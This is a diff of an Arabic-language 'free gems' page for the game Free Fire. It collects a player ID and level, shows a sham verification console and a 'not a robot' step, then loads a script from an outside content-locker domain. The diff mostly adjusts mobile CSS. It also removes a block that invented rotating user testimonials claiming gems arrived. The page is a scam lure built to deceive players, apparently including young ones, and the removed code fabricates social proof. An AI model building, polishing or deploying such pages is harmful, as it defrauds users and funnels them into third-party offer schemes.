@@ -17,121 +17,158 @@ gtag('config', 'G-WQ0798RDQ2');
 </script>
 
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
 <title>💎💎</title>
 <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
 
 <style>
 :root { --primary:#ffcc00; --red:#e41e26; --dark-text:#1e293b; }
-*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+
+/* تحسينات عامة للتجاوب مع كافة الأجهزة */
+*{
+    box-sizing:border-box;
+    -webkit-tap-highlight-color:transparent;
+    touch-action: manipulation;
+}
+
 body{
-background:#f1f5f9;
-color:var(--dark-text);
-font-family:'Cairo',sans-serif;
-margin:0;
-display:flex;
-flex-direction:column;
-align-items:center;
-padding: 20px 0;
-min-height:100vh;
+    background:#ffffff;
+    color:var(--dark-text);
+    font-family:'Cairo',sans-serif;
+    margin:0;
+    padding:0;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    /* يضمن ملء كامل الشاشة حتى في متصفحات الآيفون */
+    min-height: 100vh;
+    min-height: -webkit-fill-available;
+    overflow-x: hidden;
 }
+
 .main-container{
-width:92%;
-max-width:420px;
-background:#ffffff;
-border-radius:20px;
-padding:25px;
-border:3px solid var(--primary);
-box-shadow:0 10px 30px rgba(0,0,0,0.1);
-text-align:center;
-margin-bottom: 20px;
+    width: 90%;
+    max-width: 420px;
+    background: #ffffff;
+    border-radius: 20px;
+    padding: 20px;
+    border: 3px solid var(--primary);
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+    text-align: center;
+    /* التوسيط في منتصف الشاشة */
+    margin: 20px auto;
 }
-.game-title{font-weight:900;font-size:1.8rem;color:var(--red);margin-bottom:20px;}
+
+.game-title{
+    font-weight:900;
+    font-size: clamp(1.5rem, 5vw, 1.8rem); /* حجم خط مرن حسب حجم الشاشة */
+    color:var(--red);
+    margin-bottom:20px;
+}
+
 .step-card{display:none;flex-direction:column;align-items:center;}
 .step-card.active{display:flex;}
-h2{font-size:1.3rem;margin-bottom:20px;color:var(--dark-text);}
-.input-box{
-width:100%;
-padding:15px;
-border-radius:10px;
-border:2px solid #e2e8f0;
-background:#f8fafc;
-color:#000;
-font-size:18px;
-margin-bottom:10px;
-text-align:center;
-outline:none;
-}
-.btn-red{
-background:var(--red);
-color:#fff;
-border:none;
-padding:15px;
-width:100%;
-border-radius:10px;
-font-weight:700;
-font-size:18px;
-cursor:pointer;
-box-shadow:0 4px 0 #991b1b;
-margin-top:10px;
-}
-.gem-item{
-width:100%;
-background:#1e293b;
-padding:12px 15px;
-border-radius:12px;
-margin-bottom:10px;
-display:flex;
-justify-content:space-between;
-align-items:center;
-border:1px solid #334155;
-cursor:pointer;
-color:#fff;
-}
-.gem-info{display:flex;align-items:center;gap:10px;font-weight:bold;font-size:1.1rem;}
-.gem-tag{background:var(--primary);color:#000;padding:4px 12px;border-radius:5px;font-size:13px;font-weight:900;}
-.console{
-background:#000;
-color:#22c55e;
-font-family:monospace;
-padding:10px;
-border-radius:8px;
-font-size:12px;
-text-align:left;
-direction:ltr;
-width:100%;
-height:100px;
-overflow-y:auto;
-margin:15px 0;
-}
-.final-msg{
-color:#15803d;
-font-weight:bold;
-line-height:1.6;
-margin-bottom:15px;
-background:#f0fdf4;
-padding:10px;
-border-radius:8px;
-border:1px solid #bcf0da;
-}
-.error{color:#ff4b2b;font-size:13px;margin-bottom:10px;display:none;font-weight:bold;}
-#robot-msg { color: red; font-weight: bold; margin-bottom: 10px; display: none; font-size: 1.1rem; }
 
-/* قسم التعليقات الحيّة المتغيرة */
-.comments-section { width: 92%; max-width: 420px; background: #fff; border-radius: 15px; padding: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
-.comment-header { font-size: 14px; font-weight: bold; border-bottom: 1px solid #eee; padding-bottom: 8px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; }
-.live-indicator { color: #10b981; font-size: 11px; display: flex; align-items: center; gap: 4px; }
-.dot { width: 7px; height: 7px; background: #10b981; border-radius: 50%; animation: blink 1s infinite; }
-@keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-.comment-box { border-bottom: 1px solid #f1f5f9; padding: 10px 0; display: flex; gap: 10px; animation: slideDown 0.4s ease-out; }
-@keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
-.user-avatar { width: 35px; height: 35px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: white; flex-shrink: 0; font-size: 14px; }
-.user-name { font-weight: bold; font-size: 13px; margin: 0; color: #334155; }
-.comment-text { font-size: 12.5px; margin: 2px 0; color: #475569; line-height: 1.4; }
-.comment-time { font-size: 10px; color: #94a3b8; }
-.add-comment-area { margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px; }
-.comment-input { width: 100%; padding: 8px; border-radius: 8px; border: 1px solid #cbd5e1; font-family: inherit; font-size: 13px; outline: none; background: #f8fafc; }
-.post-btn { background: #3b82f6; color: white; border: none; padding: 6px 15px; border-radius: 5px; margin-top: 5px; font-size: 12px; cursor: pointer; float: left; font-weight: bold; }
+h2{
+    font-size: clamp(1.1rem, 4vw, 1.3rem);
+    margin-bottom:20px;
+    color:var(--dark-text);
+}
+
+.input-box{
+    width:100%;
+    padding:15px;
+    border-radius:10px;
+    border:2px solid #e2e8f0;
+    background:#f8fafc;
+    color:#000;
+    font-size:18px;
+    margin-bottom:10px;
+    text-align:center;
+    outline:none;
+    -webkit-appearance: none; /* يمنع التصميم الافتراضي المزعج في آيفون */
+}
+
+.btn-red{
+    background:var(--red);
+    color:#fff;
+    border:none;
+    padding:15px;
+    width:100%;
+    border-radius:10px;
+    font-weight:700;
+    font-size:18px;
+    cursor:pointer;
+    box-shadow:0 4px 0 #991b1b;
+    margin-top:10px;
+    transition: transform 0.1s;
+}
+
+.btn-red:active {
+    transform: translateY(2px);
+    box-shadow: 0 2px 0 #991b1b;
+}
+
+.gem-item{
+    width:100%;
+    background:#1e293b;
+    padding: 12px clamp(10px, 3vw, 15px);
+    border-radius:12px;
+    margin-bottom:10px;
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    border:1px solid #334155;
+    cursor:pointer;
+    color:#fff;
+}
+
+.gem-info{display:flex;align-items:center;gap:10px;font-weight:bold;font-size: clamp(0.9rem, 3.5vw, 1.1rem);}
+.gem-tag{background:var(--primary);color:#000;padding:4px 12px;border-radius:5px;font-size:13px;font-weight:900;}
+
+.console{
+    background:#000;
+    color:#22c55e;
+    font-family:monospace;
+    padding:10px;
+    border-radius:8px;
+    font-size:12px;
+    text-align:left;
+    direction:ltr;
+    width:100%;
+    height: 120px;
+    overflow-y:auto;
+    margin:15px 0;
+}
+
+.final-msg{
+    color:#15803d;
+    font-weight:bold;
+    line-height:1.6;
+    margin-bottom:15px;
+    background:#f0fdf4;
+    padding:10px;
+    border-radius:8px;
+    border:1px solid #bcf0da;
+}
+
+.error{color:#ff4b2b;font-size:13px;margin-bottom:10px;display:none;font-weight:bold;}
+
+#robot-msg {
+    color: red;
+    font-weight: bold;
+    margin-bottom: 10px;
+    display: none;
+    font-size: 1.1rem;
+}
+
+/* حل مشكلة الحواف في الهواتف الصغيرة جداً */
+@media (max-width: 320px) {
+    .main-container { padding: 15px; }
+    .game-title { font-size: 1.3rem; }
+}
 </style>
 </head>
 
@@ -142,14 +179,14 @@ border:1px solid #bcf0da;
 
 <div id="step1" class="step-card active">
 <h2>تسجيل الدخول بمعرف اللاعب</h2>
-<input type="text" id="p-id" class="input-box" placeholder="معرف اللاعب (ID)" inputmode="numeric">
+<input type="text" id="p-id" class="input-box" placeholder="معرف اللاعب (ID)" inputmode="numeric" pattern="[0-9]*">
 <p id="err" class="error">⚠️ خطأ يرجى إدخال ID صحيح</p>
 <button class="btn-red" onclick="valID()">تسجيل الدخول</button>
 </div>
 
 <div id="step2" class="step-card">
 <h2>ما هو مستواك في اللعبة؟</h2>
-<input type="text" id="p-lvl" class="input-box" placeholder="Account Level" inputmode="numeric">
+<input type="text" id="p-lvl" class="input-box" placeholder="Account Level" inputmode="numeric" pattern="[0-9]*">
 <button class="btn-red" onclick="move(3)">تأكيد المستوى</button>
 </div>
 
@@ -167,24 +204,14 @@ border:1px solid #bcf0da;
 
 <div id="fin" style="display:none;">
 <p class="final-msg">تم التحقق من الحساب بنجاح</p>
+
 <div id="robot-msg">الرجاء تأكيد أنك لست روبوت</div>
+
 <div data-captcha-enable="true"></div>
+
 <button class="btn-red" style="background:var(--primary);color:#000;box-shadow:0 4px 0 #b79500;" onclick="final()">اضغط للتحقق الأخير</button>
 </div>
 </div>
-</div>
-
-<div class="comments-section">
-    <div class="comment-header">
-        <span>أحدث التعليقات</span>
-        <div class="live-indicator"><span class="dot"></span> مباشر الآن</div>
-    </div>
-    <div id="comments-list"></div>
-    <div class="add-comment-area">
-        <textarea id="user-msg" class="comment-input" rows="1" placeholder="اكتب تعليقك هنا"></textarea>
-        <button class="post-btn" onclick="userPost()">إرسال</button>
-        <div style="clear: both;"></div>
-    </div>
 </div>
 
 <script>
@@ -225,56 +252,9 @@ document.getElementById('wait-text').innerText="اكتمل الفحص";
 function final(){
     document.getElementById('robot-msg').style.display = 'block';
 }
-
-// مصفوفات البيانات العشوائية للتعليقات
-const dynamicNames = ["خالد العتيبي", "يوسف الحربي", "محمد القحطاني", "سارة الشمري", "ياسين بركات", "فهد العنزي", "عبدالله م.", "ريان حسن", "عمر اليافعي", "مريم جاد"];
-const dynamicTexts = [
-    "وصلتني الجواهر الآن شكراً لكم",
-    "الموقع صادق جداً جربوه يا شباب",
-    "أفضل موقع شحن جواهر فري فاير بدون كذب",
-    "شحنت 1080 جوهرة ووصلت في ثواني",
-    "يا شباب لا يفوتكم العرض شغال مية بمية",
-    "شكراً للقائمين على الموقع أخيراً حصلت على الجواهر",
-    "جربت الـ ID الخاص بي وفعلاً تم التحقق بنجاح",
-    "طريقة سهلة جداً وسريعة في الشحن"
-];
-const dynamicColors = ["#3b82f6", "#10b981", "#f59e0b", "#ef4444", "#8b5cf6", "#ec4899", "#06b6d4"];
-
-function createCommentHTML(name, text, color) {
-    return `<div class="comment-box"><div class="user-avatar" style="background:${color}">${name.charAt(0)}</div><div class="comment-content"><p class="user-name">${name}</p><p class="comment-text">${text}</p><p class="comment-time">الآن</p></div></div>`;
-}
-
-function updateComments(html) {
-    const list = document.getElementById('comments-list');
-    list.insertAdjacentHTML('afterbegin', html);
-    // إبقاء 3 تعليقات فقط في القائمة
-    if (list.children.length > 3) list.removeChild(list.lastChild);
-}
-
-function userPost() {
-    const input = document.getElementById('user-msg');
-    if(input.value.trim() !== "") {
-        updateComments(createCommentHTML("زائر", input.value, "#64748b"));
-        input.value = "";
-    }
-}
-
-// توليد تعليقات تلقائية متغيرة بالكامل
-function generateRandomComment() {
-    const randomName = dynamicNames[Math.floor(Math.random() * dynamicNames.length)];
-    const randomText = dynamicTexts[Math.floor(Math.random() * dynamicTexts.length)];
-    const randomColor = dynamicColors[Math.floor(Math.random() * dynamicColors.length)];
-    updateComments(createCommentHTML(randomName, randomText, randomColor));
-}
-
-window.onload = () => {
-    // إضافة أول تعليق فور التحميل
-    generateRandomComment();
-    // تكرار العملية كل 8 ثواني لضمان تجدد الأسماء والتعليقات
-    setInterval(generateRandomComment, 8000);
-};
 </script>
 
 <script type="text/javascript" src="https://lockedpage1.website/cp/js/dxdkp"></script>
+
 </body>
 </html>
